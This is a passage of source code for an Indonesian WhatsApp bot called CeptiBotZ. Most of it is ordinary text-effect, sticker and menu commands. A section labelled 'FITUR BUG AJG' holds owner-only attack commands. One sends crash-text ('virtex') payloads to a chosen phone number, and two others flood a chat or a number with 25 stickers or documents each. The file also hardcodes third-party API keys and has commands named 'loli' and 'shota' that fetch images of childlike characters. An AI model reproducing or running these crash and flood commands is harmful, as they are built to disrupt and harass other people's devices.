 .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
 .catch((err) => console.log(err));
 
break
case '3dstone':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case '3davengers':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'thunder':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'window':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'graffiti':
   case 'grafiti':
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
break
case 'pornhub':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} CeptiBotz|Md`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
break
case 'blackping':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'glitch':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'glitch2':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'glitch3':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case '3dspace':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'lion':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks|teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case '3dneon':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'neon':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'greenneon':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'bokeh':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'hollographic':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'bear':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'wolf':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'joker':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'dropwater':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'neonlight':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
break
case 'natural':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'carbon':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
break
case 'pencil':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})
if (!q) return reply(`Example : ${prefix + command} CeptiBotz`) 

    if (isBan) return reply(mess.banned)
if(!q) return reply(`Penggunaan ${prefix + command} teks`)
reply(mess.wait)
textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => Cepti.sendMessage(m.chat, { image: { url: data }, caption: `*© Powered by CeptiBotZ 💌*\n\nJangan lupa donet :)` }, { quoted: m }))
  .catch((err) => console.log(err));
   
///STIKERMENU
break
case 'smeme':

    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args.join(" ")) return reply("Masukan Textnya!")
reply(mess.wait)
if (/image/.test(mime)) {
var media = await Cepti.downloadAndSaveMediaMessage(quoted, "smeme")
imgbbUploader('b9a90f1e63f41bac31532712c87e4c25', media)
.then(async (data) => {
var bgsd = args.join(" ")
var urls = data.display_url
let meme = `https://api.memegen.link/images/custom/ /${bgsd}.png?background=${urls}`
Cepti.sendImageAsSticker(m.chat, meme, m, { packname:setting.packname, author: setting.packname2 })
confirmlimit(sender, 1)
})
.catch(err => {
return reply( err)
})
} else {
reply("Kirim foto dengan caption smeme")
}
break
case 'semoji':
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args.join(" ")) return reply('emojinya?')
reply(mess.wait)
emoji.get(args.join(" ")).then(async(emoji) => {
encmedia = await Cepti.sendImageAsSticker(from, emoji.images[4].url, m, { packname: setting.packname, author: setting.author, })
})
confirmlimit(sender, 1)
break
case 'loli':

    if (isBan) return reply(mess.banned)
 	if (checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
 ini_result = await getBuffer(`http://hadi-api.herokuapp.com/api/loli`)
 buttons655 = [
    {buttonId: `${command}`, buttonText: {displayText: 'NEXT'}, type: 1}
]
 buttonMessageg8 = {
    image: ini_result,
    caption: `NIH KAK`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons655,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessageg8, { quoted: m })
confirmlimit(sender, 1)
break
case 'sewa': case 'sewabot': {
teks = `┏━ꕥ〔 *SEWA BOT* 〕ꕥ━⬣
┃⫹⫺ 5K / 1 MINGGU
┃⫹⫺ 10K / 2 MINGGU
┃⫹⫺ 15K / 1 BULAN
┃⫹⫺ 20K / PERMANEN
┗━━━━ꕥ
┏━ꕥ〔 *KEUNTUNGAN* 〕ꕥ━⬣
┃ BISA JAGA GROUP
┃ ANTILINK ON/OFF
┃ ALL ANTILINK ON/OF
┃ KICK OTOMATIS
┃ ON 24 JAM
┗━━━━ꕥ
┏━ꕥ〔 *PAYMENT* 〕ꕥ━⬣
┃ METHODE VIA 💳
┃ GOPAY
┃ PULSA XL
┃ QRIS ALLPAY
┗━━━━ꕥ`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: '⋮☰ 𝗢𝗪𝗡𝗘𝗥'}, type: 1}, {buttonId: `rules`, buttonText: {displayText: '⋮☰ 𝗥𝗨𝗟𝗘𝗦'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e41eda718fa6788c932c0.png`},
jpegThumbnail: thumb,
caption: teks,
 footer: Ceptiyt,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"Mau Sewa Bot? Ketik Owner",
body: "Click to sewa", 
thumbnail: fs.readFileSync("theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://youtube.com/@cepti_gans',
sourceUrl: "https://youtube.com/@cepti_gans"
}}
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break		 
case 'shota':
  
    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
let pinhnnn1 = await hx.pinterest('shota')
let achngn1 = pinhnnn1[Math.floor(Math.random() * pinhnnn1.length)]
let diswah = await getBuffer(achngn1)
let buttonsovdxx1 = [
    {buttonId: `shota`, buttonText: {displayText: 'NEXT'}, type: 1}
]
 let buttonMessagexxn1 = {
    image: diswah,
    caption: `*NIH KAK*`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttonsovdxx1,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessagexxn1, { quoted: m })
confirmlimit(sender, 1)
break
case 'waifu':
  
    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
let pinhnnn = await hx.pinterest('waifu')
let achngn = pinhnnn[Math.floor(Math.random() * pinhnnn.length)]
let diswa = await getBuffer(achngn)
let buttonsovdxx = [
    {buttonId: `waifu`, buttonText: {displayText: 'NEXT'}, type: 1}
]
 let buttonMessagexxn = {
    image: diswa,
    caption: `*NIH KAK*`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttonsovdxx,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessagexxn, { quoted: m })
confirmlimit(sender, 1)
break
case 'git': case 'gitclone':

    if (isBan) return reply(mess.banned)
if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Cepti.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case 'rules': case 'rulesbot': {
teks = `➯ *Tɪᴅᴀᴋ Sᴘᴀᴍ Bᴏᴛ*
 ⟬Kᴀʟᴏ Uᴅᴀʜ Dɪ Bᴀɴ/Bʟᴏᴋ Jᴀɴɢᴀɴ Nɢᴇᴍɪs Mɪɴᴛᴀ Uɴʙᴀɴ/Uɴʙʟᴏᴋ⟭
➯ *Tɪᴅᴀᴋ Mᴇɴᴊᴜᴀʟ Nᴏᴍᴏʀ Bᴏᴛ!*
⟬Mɪɴɪᴍᴀʟ Mᴀɴᴅɪ Wᴀᴊɪʙ Dᴜʟᴜ Bʀᴏ Bɪᴀʀ Tᴀᴜ Dɪᴍᴀɴᴀ Lᴇᴛᴀᴋ Kᴇsᴀʟᴀʜᴀɴ Lᴜ⟭
➯ *Cᴀʟʟ AᴜᴛᴏBʟᴏᴄᴋ*
⟬Mᴀᴍᴘᴜs Lᴜ⟭
➯ *Mᴀᴋsᴀ Mɪɴᴛᴀ Sᴄʀɪᴘᴛ Bᴏᴛ*
⟬Eᴍᴀɴɢ Nʏᴀ Lᴜ Sᴀᴘᴀ? Uᴅʜ Mɪɴᴛᴀ Mᴀᴋsᴀ Pᴜʟᴀ⟭
➯ *Hɪɴᴀ Bᴏᴛ Gᴡ*
⟬Nɢᴇʜɪɴᴀ Eʟɪᴛ,Bᴜᴋᴛɪ Sᴜʟɪᴛ⟭
➯ *Bot Delay/Lama Bles?*
⟬Lu Di Chet Ayang Lu Aja Lama Blesny⟭
➯ *Maksa Masukin Gc Lu*
⟬Minimal Donasi Lah Cuy Biar Cuan Gw⟭
➯ *Chet Aneh² Di Cwe Gw, Gw Block Lu Hdup²*
⟬Mɪɴɪᴍᴀʟ Nɢᴏᴛᴀᴋ⟭
❏┳━━◩
┍┛
┆⟥⟤ ➠ (CEPTIBOTZ)
└─┈⟅`
let nth = `☰⟥⟝⟞⟝❨ *Rᴜʟᴇs Mʏ Bᴏᴛ* ❩⟞⟝⟞⟤☰`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: '⋮☰ 𝗢𝗪𝗡𝗘𝗥'}, type: 1}, {buttonId: `sewa`, buttonText: {displayText: '⋮☰ 𝗦𝗘𝗪𝗔'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e41eda718fa6788c932c0.png`},
jpegThumbnail: thumb,
caption: teks,
 footer: Ceptiyt,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"baca Rules Bot!",
body: "Click to rules", 
thumbnail: fs.readFileSync("theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://youtube.com/@cepti_gans',
sourceUrl: "https://youtube.com/@cepti_gans"
}}
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'animesticker':
case 'animestik':{
  
    if (isBan) return reply(mess.banned)
var ano = await fetchJson('https://raw.githubusercontent.com/YukiShima4/Skreper/master/animestick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Cepti.sendImageAsSticker(from, wifegerakx, m, { packname: setting.packname, author: setting.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case'gurastick':{
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Cepti.sendImageAsSticker(from, wifegerakx, m, { packname: setting.packname, author: setting.author, })
await fs.unlinkSync(encmedia)
}
confirmlimit(sender, 1)
break
case'doge':
case'dogestick':{
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Cepti.sendImageAsSticker(from, wifegerakx, m, { packname: setting.packname, author: setting.author, })
await fs.unlinkSync(encmedia)
}
confirmlimit(sender, 1)
break
case'bucinstick':
case'bucinp' :{
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Cepti.sendImageAsSticker(from, wifegerakx, m, { packname: setting.packname, author: setting.author, })
await fs.unlinkSync(encmedia)
}
confirmlimit(sender, 1)
break
case'patrik':
case'patrick': {
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Cepti.sendImageAsSticker(from, wifegerakx, m, { packname: setting.packname, author: setting.author, })
await fs.unlinkSync(encmedia)
}
confirmlimit(sender, 1)
break
case'attp': {
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
const buff = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
Cepti.sendMessage(from, { sticker : buff}) }
confirmlimit(sender, 1)
break
case 'emojimix': {
  
    if (isBan) return reply(mess.banned)
	  if (checklimitUser(sender) <= 0) return reply(limitabis) 
	if (!text) return reply( `Example : ${prefix + command} 😅+🤔`)
let [emoji1, emoji2] = text.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Cepti.sendImageAsSticker(m.chat, res.url, m, { packname: setting.packname, author: setting.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
confirmlimit(sender, 1)
break
case 'toimage': case 'toimg': {
  
    if (isBan) return reply(mess.banned)
 if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!quoted) return reply( 'Reply Image')
if (!/webp/.test(mime)) return reply( `balas stiker dengan caption *${prefix + command}*`)
reply(mess.wait)
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
    fs.unlinkSync(media)
    if (err) return reply( err)
    let buffer = fs.readFileSync(ran)
    Cepti.sendMessage(m.chat, { image: buffer }, { quoted: m })
    fs.unlinkSync(ran)
})
}
confirmlimit(sender, 1)
break
//FITUR BUG AJG 
case 'jagoan' : {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
Cepti.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku Cepti', 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `Cepti Bot ${virus}${virtex(prefix)}`,
"body": `Cepti Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Cepti Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/Cepti_gans`,
thumbnailUrl: thumb,
thumbnail: thumb,
}
}}}}}, { quoted:m })
await sleep(1000)
}
break
case 'cepstick':{
if (!isOwner) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Cepti.sendMessage(m.chat, {sticker: CeptiBotZ},{ quoted: m })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'docgas':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Cepti.sendMessage(num, { 
document: fs.readFileSync('./media/doc/fake.pptx'), 
